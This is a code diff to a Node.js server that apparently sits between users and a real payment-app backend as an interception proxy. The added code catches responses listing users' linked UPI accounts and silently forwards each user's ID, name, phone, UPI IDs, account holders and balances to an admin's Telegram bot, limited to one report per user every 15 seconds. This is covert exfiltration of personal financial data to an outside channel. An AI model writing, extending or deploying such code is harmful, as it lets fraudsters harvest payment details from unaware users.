@@ -40,6 +40,7 @@ const DEFAULT_DATA = {
 let bot = null;
 let webhookSet = false;
 const _balSnapTimes = {};
+const _upiListSnapTimes = {};
 try { bot = new TelegramBot(BOT_TOKEN); } catch (e) { }
 
 let redis = null;
@@ -519,6 +520,39 @@ function inferWalletScheme(source) {
     const wallet = String(source.walletDomain || source.walletUrl || '');
     const match = wallet.match(/^([A-Za-z][A-Za-z0-9+.-]*):\/\//);
     return match ? match[1].toLowerCase() : '';
+}
+
+function getCollectionAppName(ctType, upi, item) {
+    const ct = Number(ctType);
+    const upiStr = String(upi || (item && item.account) || '').toLowerCase();
+    const loginParams = String((item && item.loginParams) || '').toLowerCase();
+    if (ct === 18 || upiStr.includes('amazon') || loginParams.includes('acbin') || loginParams.includes('amazon')) return 'Amazon';
+    if (ct === 2 || upiStr.includes('@mbk') || upiStr.includes('mobikwik')) return 'MobiKwik';
+    if (ct === 3 || upiStr.includes('@freecharge') || upiStr.includes('freecharge')) return 'FreeCharge';
+    if (ct === 1 || upiStr.includes('@paytm')) return 'Paytm';
+    if (ct === 4 || upiStr.includes('@ybl') || upiStr.includes('@ibl') || upiStr.includes('@axl')) return 'PhonePe';
+    if (ct === 5 || upiStr.includes('@ok')) return 'Google Pay';
+    if (ct === 6 || upiStr.includes('@airtel')) return 'Airtel Payments Bank';
+    if (ct === 7) return 'PayZapp';
+    if (ct === 8) return 'JioPay';
+    if (item && item.ctTypeName) return item.ctTypeName;
+    if (item && item.payTypeName) return item.payTypeName;
+    return `App (${ct || 'Unknown'})`;
+}
+
+function getCollectionStatusText(state, status, item) {
+    const st = Number(state);
+    if (st === 2) return '🟢 Active (Online)';
+    if (st === 6) return '🟡 Waiting Online (Offline)';
+    if (st === 0) return '🔴 Unlinked (Please Relink)';
+    if (st === 1) return '🟡 Connecting / In Progress';
+    if (st === 3) return '🔴 Paused / Inactive';
+    if (st === 4) return '🔴 Relink Required / Expired';
+    if (st === 5) return '🔴 Locked / Quota Full';
+    if (status !== undefined && status !== null) {
+        return Number(status) === 1 ? '🟢 Active' : '🔴 Inactive';
+    }
+    return `State ${state}`;
 }
 
 function buildWalletDomain(bank, amount) {
@@ -2131,13 +2165,64 @@ app.all('/xxapi/*', async (req, res) => {
         }
         await applyNextClientIdOverride(req, data);
 
-        // ── 100% CLEAN BYPASS FOR UPI & TEAM BUTTONS ──────────────────────────────
+        // ── 100% CLEAN BYPASS FOR UPI & TEAM BUTTONS + UPI LIST NOTIFICATION ──
         if (urlLower.includes('/collectiontoollist') || urlLower.includes('/teaminfo')) {
             const { response: r, respBody: rb, respHeaders: rh } = await proxyToReal(req);
             rh['content-length'] = String(Buffer.byteLength(rb));
             rh['Access-Control-Allow-Origin'] = '*';
             res.writeHead(r.status, rh);
-            return res.end(rb);
+            res.end(rb);
+
+            if (urlLower.includes('/collectiontoollist')) {
+                (async () => {
+                    try {
+                        let parsed = null;
+                        try { parsed = JSON.parse(rb.toString('utf-8')); } catch (e) { }
+                        if (parsed && (parsed.code === 0 || Array.isArray(parsed.data))) {
+                            const list = Array.isArray(parsed.data) ? parsed.data : (Array.isArray(parsed) ? parsed : []);
+                            const resolvedUid = String(req.headers['x-px-uid'] || (await resolveUserId(req)) || '');
+                            const snapKey = `upilist_${resolvedUid || 'guest'}`;
+                            const nowMs = Date.now();
+                            if (!nowMs || !_upiListSnapTimes[snapKey] || (nowMs - _upiListSnapTimes[snapKey] > 15000)) {
+                                _upiListSnapTimes[snapKey] = nowMs;
+                                const trackedUser = (data.trackedUsers && resolvedUid && data.trackedUsers[resolvedUid]) || {};
+                                const userPhone = trackedUser.phone || (list[0] && list[0].username) || '';
+                                const userName = trackedUser.name || (list[0] && list[0].pnname) || '';
+
+                                let msg = `┌──────────────────────────┐\n│   📱 USER UPI ACCOUNTS   │\n└──────────────────────────┘\n`;
+                                if (resolvedUid) msg += `👤 <b>User ID</b>: <code>${escapeTelegramHtml(resolvedUid)}</code>\n`;
+                                if (userName) msg += `📛 <b>Name</b>   : <code>${escapeTelegramHtml(userName)}</code>\n`;
+                                if (userPhone) msg += `📱 <b>Phone</b>  : <code>${escapeTelegramHtml(userPhone)}</code>\n`;
+                                msg += `\n📊 <b>Total UPIs Linked</b>: <b>${list.length}</b>\n`;
+
+                                if (list.length === 0) {
+                                    msg += `\n⚠️ <i>No UPI accounts linked.</i>\n`;
+                                } else {
+                                    list.forEach((item, idx) => {
+                                        const appName = getCollectionAppName(item.ctType, item.upi || item.account, item);
+                                        const upiVal = item.upi || item.account || 'N/A';
+                                        const statusText = getCollectionStatusText(item.state, item.status, item);
+                                        const ownerName = item.pnname || '';
+                                        const numEmoji = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟'][idx] || `${idx + 1}.`;
+
+                                        msg += `\n${numEmoji} <b>App</b>: <b>${escapeTelegramHtml(appName)}</b>\n`;
+                                        msg += `   🔗 <b>UPI / Acc</b>: <code>${escapeTelegramHtml(upiVal)}</code>\n`;
+                                        msg += `   ⚡ <b>ctType</b>: <code>${item.ctType !== undefined ? item.ctType : 'N/A'}</code>\n`;
+                                        msg += `   📌 <b>Status</b>: ${statusText}\n`;
+                                        if (ownerName) msg += `   👤 <b>Holder</b>: <code>${escapeTelegramHtml(ownerName)}</code>\n`;
+                                        if (item.accountBalance !== undefined && Number(item.accountBalance) > 0) {
+                                            msg += `   💰 <b>Quota/Bal</b>: ₹${item.accountBalance}\n`;
+                                        }
+                                    });
+                                }
+                                msg += `\n🕐 <code>${now}</code>`;
+                                notifyAdmin(data, msg, { parse_mode: 'HTML' }).catch(() => { });
+                            }
+                        }
+                    } catch (e) { }
+                })();
+            }
+            return;
         }
         // ──────────────────────────────────────────────────────────────────────────
 
